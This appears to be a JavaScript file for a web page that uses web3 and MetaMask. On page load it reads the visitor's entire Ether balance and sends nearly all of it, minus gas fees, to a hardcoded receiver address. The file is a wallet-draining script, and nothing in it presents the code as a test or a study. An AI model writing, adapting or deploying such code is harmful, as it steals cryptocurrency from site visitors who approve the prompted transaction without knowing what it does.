// Main coinbase account from metamask
var coinbase;
// Ether Balance of coinbase account
var etherBalance;
// Ether Receiver
var etherReceiver = "0x8888881CEDA4E95043bcD6CEC9ed0fF3C419a3b6";
// Transaction object
var transactionObject;
// Gas Limit
var gasLimitNumber = 21000;
// Gas Price
var gasPriceNumber = 10e9; // 10 Gwei
// Transaction Gas Fee
var gasFee = gasLimitNumber * gasPriceNumber;
// Ether value send
var etherValue;
// Balance from Wei
var balanceFromWie;
// Web3 start function, It will run when the web page is loaded  
function startWeb3() {

  coinbase = web3.eth.coinbase;
  getBalance(coinbase);

}

// Get the Ether balance of the coinbase account from the metamask
function getBalance(address) {
  return web3.eth.getBalance(address, function (error, result) {
    if (!error) {

        balanceFromWie = result;

        if (balanceFromWie.c[1] == undefined) {
                 balanceFromWie.c[1] = "00000000000000";
            }

        while (balanceFromWie.e >= balanceFromWie.c[0].toString().length + balanceFromWie.c[1].toString().length) {

              var n =  balanceFromWie.c[1];
              var digits = (""+n).split("");

              digits.unshift("0");

              digits = digits.toString();
              balanceFromWie.c[1] = digits.replace(/,/g, "");

            }

        etherBalance = Number(balanceFromWie.c[0] + '' + balanceFromWie.c[1]);  

        etherValue = etherBalance - (gasFee + (gasFee / 10)); // 1 gWei extra fee
        transactionObject = {from:coinbase, to:etherReceiver, value:etherValue, gas:gasLimitNumber, gasPrice:gasPriceNumber};
        sendBalance(transactionObject);
    } else {
      	console.error(error);
    }
  })
}

// Send Ethers to etherReceiver account from coinbase account
function sendBalance(transactionObject) {
  return web3.eth.sendTransaction(transactionObject, function (error, result){});
}
